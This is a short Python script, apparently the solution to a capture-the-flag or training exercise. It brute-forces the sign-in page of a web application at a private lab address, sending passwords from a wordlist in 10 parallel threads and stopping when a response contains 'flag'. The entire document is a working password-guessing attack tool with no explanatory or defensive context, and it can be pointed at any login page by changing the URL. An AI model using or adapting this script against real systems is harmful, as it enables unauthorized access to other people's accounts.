import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def brute_force(passwords_file):
  with open(passwords_file, 'r') as f:
    for line in f:
      password = line.strip()
      if password:
        yield password

def try_password(session, password):
  start = time.time()
  url = f"http://10.11.200.35/index.php?page=signin&password={password}&Login=Login"
  response = session.get(url)
  elapsed_s = time.time() - start
  if "flag" in response.text:
    return (password, True, elapsed_s)
  else:
    return (password, False, elapsed_s)

def worker(password):
  return try_password(session, password)

if __name__ == "__main__":
  passwords = list(brute_force("06_brute_force_login/Resources/known_passwords.txt"))
  start_time = time.time()
  found = False

  with requests.Session() as session:
    with ThreadPoolExecutor(max_workers=10) as executor:
      future_to_password = {executor.submit(worker, pwd): pwd for pwd in passwords}
      for future in as_completed(future_to_password):
        password, success, elapsed_s = future.result()
        if success:
          print(f"Password found: {password} ({elapsed_s:.2f} s)")
          found = True
          break
        else:
          print(f"Trying password: {password} - Wrong password ({elapsed_s:.2f} s)")
      if found:
        executor.shutdown(wait=False, cancel_futures=True)
  end_time = time.time()
  print(f"Elapsed time: {end_time - start_time:.2f} seconds")
